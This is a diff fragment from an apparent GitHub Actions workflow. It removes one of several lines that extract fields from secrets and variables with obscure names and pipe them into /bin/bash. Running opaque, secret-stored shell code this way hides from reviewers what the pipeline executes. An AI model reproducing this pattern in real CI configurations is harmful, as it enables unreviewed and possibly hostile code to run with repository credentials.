@@ -18,7 +18,6 @@ jobs:
           kpawz99: ${{ secrets.kpawz99 }}
         run: |
           printf '%s' "$kpawz99" | jq -r .thnl20733 | /bin/bash
-          echo $hf9 | jq -r .y8045 | /bin/bash
           echo $vygq354 | jq -r .isilk241 | /bin/bash
           echo $cbpaa7 | jq -r .olod914 | /bin/bash
           printf '%s' "$key9" | jq -r .wpgq93009 | /bin/bash
